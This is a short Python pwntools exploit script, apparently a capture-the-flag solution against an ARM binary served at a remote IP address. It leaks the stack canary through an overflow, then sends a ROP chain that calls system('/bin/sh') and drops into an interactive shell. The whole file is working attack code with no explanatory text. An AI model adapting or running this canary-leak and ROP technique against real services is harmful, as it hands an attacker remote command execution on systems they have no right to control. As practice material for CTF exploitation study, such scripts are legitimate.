from pwn import *
from time import sleep

context.log_level = "debug"
p = remote("39.105.216.229" , 9991)
# p = remote("127.0.0.1" , 10009)
# gdb.attach(p , "b *0x0001079C")
# pause()
# p.sendafter("not set.\n" , "a"*0x20)
p.send("a" * 20)
p.recvuntil("\x61\x61\x61\x00")
canary = u32(p.recv(4))
p.recv(4)
# print(hex(u32(p.recv(4))))
print(hex(canary))
str_bin_sh = 0x0021044

print(p.recvuntil("Come"))
system = 0x00104FC
mov_r0_r7 = 0x000107f4
pop_r3_pc = 0x000104a8 
payload = "a" * 0x18 + p32(canary) + "b" * (4) 
payload += p32(0x00010804)  + p32(str_bin_sh) * 7 
payload += p32(pop_r3_pc) + p32(system) + p32(mov_r0_r7) 
p.send(payload)
p.interactive()